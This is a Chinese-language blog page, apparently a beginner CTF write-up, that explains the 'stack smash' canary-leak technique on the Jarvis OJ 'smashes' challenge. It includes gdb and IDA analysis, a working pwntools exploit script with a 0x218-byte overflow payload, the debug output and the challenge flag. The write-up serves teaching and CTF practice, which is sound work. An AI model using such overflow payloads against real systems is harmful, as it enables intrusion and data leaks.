@@ -1,0 +1,313 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN入门（2-4-1）-花式栈溢出技巧-Stack smash | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN入门（2-4-1）-花式栈溢出技巧-Stack smash 参考资料：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4657#toc-2https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;107628831题目环境：nc pwn.jarvisoj.com 9877附件：链接：https:&#x2F;&#x2F;pan.baidu.c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（2-4-1）-花式栈溢出技巧-Stack smash">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-1%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-Stack%20smash/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="PWN入门（2-4-1）-花式栈溢出技巧-Stack smash 参考资料：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4657#toc-2https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;107628831题目环境：nc pwn.jarvisoj.com 9877附件：链接：https:&#x2F;&#x2F;pan.baidu.c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-06/800/450">
+<meta property="article:published_time" content="2020-08-19T10:52:35.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:15.789Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-06/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PWN入门（2-4-1）-花式栈溢出技巧-Stack smash",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-1%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-Stack%20smash/",
+  "image": "https://picsum.photos/seed/blog-cover-06/800/450",
+  "datePublished": "2020-08-19T10:52:35.000Z",
+  "dateModified": "2026-07-03T14:46:15.789Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-1%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-Stack%20smash/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN入门（2-4-1）-花式栈溢出技巧-Stack smash',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-06/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN入门（2-4-1）-花式栈溢出技巧-Stack smash</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（2-4-1）-花式栈溢出技巧-Stack smash</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-19T10:52:35.000Z" title="发表于 2020-08-19 18:52:35">2020-08-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:15.789Z" title="更新于 2026-07-03 22:46:15">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PWN入门（2-4-1）-花式栈溢出技巧-Stack-smash"><a href="#PWN入门（2-4-1）-花式栈溢出技巧-Stack-smash" class="headerlink" title="PWN入门（2-4-1）-花式栈溢出技巧-Stack smash"></a>PWN入门（2-4-1）-花式栈溢出技巧-Stack smash</h1><blockquote>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4657#toc-2">https://xz.aliyun.com/t/4657#toc-2</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/107628831">https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;107628831</a><br>题目环境：<strong>nc pwn.jarvisoj.com 9877</strong><br>附件：<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1KnFHzFpMXFKOmBFgsxwB7g">https://pan.baidu.com/s/1KnFHzFpMXFKOmBFgsxwB7g</a><br>提取码：3gc9</p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Stack smash简单点来说就是绕过Canary保护的技术。在程序加载了canary保护之后，如果我们通过栈溢出在覆盖缓冲区的时候就会连带着覆盖了canary保护的Cookie，<span style="color: #F5222D">这个时候程序就会报错。但是这个技术并不在乎是否报错，而是在乎报错的内容。stack smash技巧就是利用打印这一信息的程序来得到我们想要的内容。</span>这是因为在程序启动canary保护之后，如果发现canary被修改的话就会执__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下这个指针指向程序名。代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串地址，那么在__fortify_fail函数中就会输出我们想要的信息。</p>
+<p>简单的来说，就是利用程序的栈溢出来打印flag，比如说：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597912962385-fff970bf-f4bc-476e-a8e9-5e76add92b94.png" alt="QQ截图20200820164223.png"></p>
+<blockquote>
+<p>红箭头所指向的地方就是argv[0]指针所指向的字符串</p>
+</blockquote>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>将文件下载下来，看一下程序的运行流程：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597911081390-b9b95ccb-6f6d-4e49-9c78-bbec7a6ec58b.png" alt="QQ截图20200820161113.png"></p>
+<p>再看以下文件的保护情况：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597911616203-78fab38c-74b7-42e7-9b40-ef17698498bd.png" alt="QQ截图20200820162007.png"></p>
+<p>程序开启了NX（栈上不可执行）和Canary保护。</p>
+<blockquote>
+<p>请注意这个Canary保护，待会我们通过它得到flag</p>
+</blockquote>
+<p>将文件扔到IDA中，看sub_4007E0的伪代码：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597911131294-96b2dd58-34ca-4724-8ba1-7c7a2a888694.png" alt="QQ截图20200820161203.png"></p>
+<p>程序提供了两次输入：!_IO_gets(&amp;v3)和_IO_getc(stdin);；这两次输入都存在这栈溢出漏洞。</p>
+<p>顺带提一下第二次的输入：我们将内容输入到stdio中，最后赋值给了byte_600D20</p>
+<p>再看以下memset函数：  memset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));</p>
+<blockquote>
+<p>memset函数的原型为：<br>void * memset( void * ptr, int value, size_t num );<br>参数说明：<br>ptr 为要操作的内存的指针。<br>value 为要设置的值。你既可以向 value 传递 int 类型的值，也可以传递 char 类型的值，int 和 char 可以根据 ASCII 码相互转换。<br>num 为 ptr 的前 num 个字节，size_t 就是unsigned int。</p>
+</blockquote>
+<p>因此这个函数的意思是从v1 + 0x600D20LL这个地址往后32 - v1字节的内容都以0替代。</p>
+<p>我们再看一下的byte_600D20内容：PCTF{Here’s the flag on server}</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597911492293-957b767a-ca64-4c99-928b-6d2994aa0ba2.png" alt="QQ截图20200820161755.png"></p>
+<p>这个flag提示我们真正的flag在服务器上，因此这道题并不是让我们getshell，而是通过栈溢出打印出远程服务器上真正的flag。</p>
+<p>那么这时候问题就来了，程序会要求我们输入内容，但是输入的内容总会覆盖真正的flag（byte_600D20），那现在应该怎么办呢？</p>
+<p>这时候我们就需要利用“<span style="color: #555555">ELF重映射”</span>特点：</p>
+<p><span style="color: #F5222D">在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出</span></p>
+<blockquote>
+<p><strong><span style="color: #F5222D">当可执行文件足够小的时候，他的不同区段可能会被多次映射。</span></strong></p>
+</blockquote>
+<blockquote>
+<p><span style="color: #F5222D">注：flag字符串存在于data段，但是</span><span style="color: #F5222D">bss段会被映射两次，这里不理解，存疑…</span></p>
+</blockquote>
+<p>这句话是什么意思呢？我们可以打开gdb来看一下，首先在main函数（0x4006D0）下断点（这里下任意断点就行），然后运行程序：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597913337582-56cdde06-cd5c-47e0-bbe8-969e69b8aed7.png" alt="QQ截图20200820164836.png"></p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597913371254-42c6a0b4-27e8-45c4-8517-8d27d3d53730.png" alt="QQ截图20200820164920.png"></p>
+<p>输入“vmmap”查看程序的内存映射：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597913456255-fa83d318-d210-4365-803a-bb1321294158.png" alt="QQ截图20200820165046.png"></p>
+<p>请注意上图开头的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/ubuntu/Desktop/smashes</span><br><span class="line"><span class="number">0x600000</span>           <span class="number">0x601000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      /home/ubuntu/Desktop/smashes</span><br></pre></td></tr></table></figure>
+
+<p>在调试的时候可以看到smashes被映射到两处地址中，所以只要在二进制文件（offset）0x000000000 ~ 0x00001000范围内的内容都会被映射到内存中，分别以0x600000和0x400000作为起始地址。flag在0x00000d20，所以会在内存中出现两次，分别位于0x00600d20和0x00400d20。所以虽然0x00600d20位置的flag被覆盖了，但是依然可以在0x00400d20找到flag（相当于flag的备份）。</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597913786296-3a7f4d97-4361-4a9b-bf20-6fafd9c285ca.png" alt="QQ截图20200820165617.png"></p>
+<p>我们知道了flag在内存中存放的位置，接下来就要让程序打印出来它</p>
+<h4 id="寻找argv-0-指针位置"><a href="#寻找argv-0-指针位置" class="headerlink" title="寻找argv[0]指针位置"></a>寻找argv[0]指针位置</h4><p>接下来寻找一下argv[0]所在的位置，argv[0]会有一个明显的特征，就是他会指向程序名，所以我们可以使用gdb在main函数处下断点来寻找：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597915252183-e506f7d3-11af-48a5-bb6e-87d7b91afdf5.png" alt="QQ截图20200820172044.png"></p>
+<p>可以看到在0x7fffffffe2d4中存放着程序名称，但是这个地址被存放在0x7fffffffdf68处，所以只要把0x7fffffffdf68中的内容替换成flag就可以了。</p>
+<p>当然也可以在gdb中使用命令“p &amp; __libc_argv[0]”就可以得到argv[0]的地址</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597915426801-2ad67205-3fc0-417e-bf4c-cec5eaf1b261.png" alt="QQ截图20200820172318.png"></p>
+<h4 id="寻找输入时的栈顶位置"><a href="#寻找输入时的栈顶位置" class="headerlink" title="寻找输入时的栈顶位置"></a>寻找输入时的栈顶位置</h4><p>为什么这一步要找输入时的栈顶位置呢？往下看就知道了。</p>
+<p>首先我们先看一下gets函数调用的位置，在IDA中查看：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597915877949-0f470ef6-2bb3-43eb-8dbc-9edd9c6d2e9a.png" alt="QQ截图20200820173058.png"></p>
+<p>从汇编中可以看出在call gets之前，程序将参数放在了rdi中，由于有mov rdi, rsp的存在，因此gets的参数一开始是放在栈里的。继续gdb调试，在gets（0x40080E）下断点，查看栈的内容，如下图所示：</p>
+<p><img src="/assets/posts/pwn-2-4-1-stack-smash-1eb45yt/assets/1597916401866-17461c47-1ad9-43e9-b8da-d1712ba76814.png" alt="QQ截图20200820173950.png"></p>
+<p>可以看到当前的rdi寄存器中的值为rsp寄存器的内容，因为在64位程序中rdi寄存器中存放的是当前执行函数的一参，所以当前的栈顶就是gets函数的一参。所以当前栈顶的位置到刚才的argv[0]的偏移距离就是我们的溢出长度，所以我们通过计算0x7fffffffdf68-0x7fffffffdd50&#x3D;0x218</p>
+<p>也就是说我们输入内容要在0x218以后才能把argv[0]给覆盖掉，并且输入0x218个内容之后把0x00400d20（flag地址）写上就可以了。</p>
+<p>exp如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding=utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>,<span class="number">9877</span>)</span><br><span class="line"><span class="meta">#p=process(<span class="string">&#x27;./smashes&#x27;</span>)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x218</span>+p64(<span class="number">0x400d20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name? &#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;flag: &#x27;</span>,<span class="string">&#x27;Cyberangel&#x27;</span>)#第二次的gets输入任意内容即可</span><br><span class="line">print p.recv()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop<span class="variable">$</span> python <span class="number">1</span>.py</span><br><span class="line">[+] Opening connection to pwn.jarvisoj.com on port <span class="number">9877</span>: Done</span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x19 bytes:</span><br><span class="line">    <span class="string">&#x27;Hello!\n&#x27;</span></span><br><span class="line">    <span class="string">&quot;What&#x27;s your name? &quot;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x221 bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000210</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">20</span> <span class="number">0</span>d <span class="number">40</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │aaaa│aaaa│ ·<span class="selector-tag">@</span>·│····│</span><br><span class="line">    <span class="number">00000220</span>  <span class="number">0</span>a                                                  │·│</span><br><span class="line">    <span class="number">00000221</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x24a bytes:</span><br><span class="line">    <span class="string">&#x27;Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \r&#x27;</span></span><br><span class="line">    <span class="string">&#x27;@.\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Please overwrite the flag: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>xb bytes:</span><br><span class="line">    <span class="string">&#x27;Cyberangel\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x5c bytes:</span><br><span class="line">    <span class="string">&#x27;Thank you, bye!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;*** stack smashing detected ***: PCTF&#123;57dErr_Smasher_good_work!&#125; terminated\n&#x27;</span></span><br><span class="line">Thank you, bye!</span><br><span class="line">*** stack smashing detected ***: PCTF&#123;<span class="number">57</span>dErr_Smasher_good_work!&#125; terminated</span><br><span class="line"></span><br><span class="line">[*] Closed connection to pwn.jarvisoj.com port <span class="number">9877</span></span><br><span class="line">ubuntu@ubuntu:~/Desktop<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+
+<p>flag：PCTF{57dErr_Smasher_good_work!}</p>
